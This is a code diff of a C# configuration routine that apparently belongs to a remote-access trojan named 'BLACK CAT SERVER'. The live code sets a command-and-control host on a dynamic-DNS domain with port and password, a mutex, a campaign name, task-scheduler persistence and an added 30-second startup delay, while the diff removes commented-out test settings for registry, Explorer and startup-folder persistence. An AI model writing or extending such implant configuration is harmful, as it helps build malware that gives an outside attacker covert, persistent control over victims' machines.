@@ -6,43 +6,16 @@ namespace bc.srv.Class
     {
         public static bool InitializeStClient()
         {
+            SrvData.Instance.StartupDelay = 30000;
+
             
-//             #if DEBUG
-//             //TEST
-//             ST_Client.Instance.Port = 2401;
-//             ST_Client.Instance.Password = "cammello";
-//             ST_Client.Instance.Host = "127.0.0.1";
-//
-//             ST_Client.Instance.bUseHKCU = false;
-//             ST_Client.Instance.bUseExplorer = false;
-//             ST_Client.Instance.bUseStartupFolder = false;
-//
-//             ST_Client.Instance.sAppDataInstall = @"BLACK CAT SERVER\TEST\SERVER.EXE";
-//             ST_Client.Instance.sStartupFileName = @"SERVER.EXE";
-//
-//             ST_Client.Instance.sExplorerEntry = "EXPLO";
-//             ST_Client.Instance.sHKCUEntry = "HKCU";
-//
-//             ST_Client.Instance.sMutex = "MUTEX_TEST";
-//
-//
-//             //TEST
-// #else
-
             // NORMAL
-
             SrvData.Instance.Port = 2401;
             SrvData.Instance.Password = "slevin";
             SrvData.Instance.Host = "lqphnd2gfz.duckdns.org";
             SrvData.Instance.ServerName = "imback";
             SrvData.Instance.sMutex = "tUOns2DB6";
 
-            // RECUPERO INFO INSTALLAZIONE
-            // bool usehk, useex, usestart;
-            // string apppath, startupfilename;
-            // string hkcuEntry, exploEntry;
-            //
-            // ru.GetInstallInfo(out usehk, out useex, out apppath, out usestart, out startupfilename, out hkcuEntry, out exploEntry);
 
 
             SrvData.Instance.UseTaskScheduler = true;
